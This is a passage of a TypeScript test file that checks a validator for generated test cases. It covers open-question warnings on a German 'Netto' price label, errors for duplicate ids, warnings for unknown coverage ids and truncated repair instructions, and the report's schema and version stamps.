  intent.detectedFields[0] = {
    ...intent.detectedFields[0]!,
    label: "Höhe des Kaufpreises (Netto)",
  };
  intent.openQuestions = [
    "Es ist fachlich zu klären, wie sich die Auswahl Netto / Brutto auf Feldbezeichnungen und Berechnung auswirkt.",
  ];

  const tc = buildCase({
    title: "Netto label visible",
    objective: "Confirm the Netto field label is visible.",
    steps: [
      {
        index: 1,
        action:
          'Verifiziert, dass das Label "Höhe des Kaufpreises (Netto)" sichtbar ist.',
        expected: "Das Label ist sichtbar.",
      },
    ],
    expectedResults: ["Das Label ist sichtbar."],
    qualitySignals: {
      coveredFieldIds: ["s-payment::field::n-iban"],
      coveredActionIds: [],
      coveredValidationIds: [],
      coveredNavigationIds: [],
      confidence: 0.85,
    },
  });

  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent,
  });

  assert.equal(report.blocked, false, JSON.stringify(report.issues, null, 2));
  assert.ok(
    report.issues.some(
      (issue) =>
        issue.code === "needs_open_question_clarification" &&
        issue.severity === "warning",
    ),
  );
  assert.equal(
    report.issues.some(
      (issue) => issue.code === "unsupported_unresolved_validation_detail",
    ),
    false,
  );
});

test("duplicate test case ids surface as errors", () => {
  const a = buildCase({ id: "tc-1" });
  const b = buildCase({ id: "tc-1" });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([a, b]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, true);
  assert.ok(report.issues.some((i) => i.code === "duplicate_test_case_id"));
});

test("coverage ids that reference unknown intent ids surface as warnings", () => {
  const tc = buildCase({
    qualitySignals: {
      coveredFieldIds: ["s-payment::field::n-unknown"],
      coveredActionIds: [],
      coveredValidationIds: [],
      coveredNavigationIds: [],
      confidence: 0.8,
    },
  });
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([tc]),
    intent: buildIntent(),
  });
  assert.equal(report.blocked, false);
  assert.equal(report.warningCount, 1);
  assert.equal(report.issues[0]?.code, "quality_signals_coverage_unknown_id");
});

test("truncated repair instruction audit metadata surfaces as a warning", () => {
  const baseAudit = buildCase().audit;
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList([
      buildCase({
        audit: {
          ...baseAudit,
          truncatedInstructionCount: 2,
        },
      }),
    ]),
    intent: buildIntent(),
  });
  const warning = report.issues.find(
    (issue) => issue.code === "truncated_repair_instruction",
  );
  assert.ok(warning);
  assert.equal(warning.severity, "warning");
  assert.equal(warning.path, "$.testCases[0].audit.truncatedInstructionCount");
});

test("report carries deterministic shape stamps", () => {
  const report = validateGeneratedTestCases({
    jobId: "job-1",
    generatedAt: GENERATED_AT,
    list: buildList(),
    intent: buildIntent(),
  });
  assert.equal(report.schemaVersion, "1.0.0");
  assert.equal(report.contractVersion, TEST_INTELLIGENCE_CONTRACT_VERSION);
  assert.equal(report.jobId, "job-1");
  assert.equal(report.generatedAt, GENERATED_AT);
});
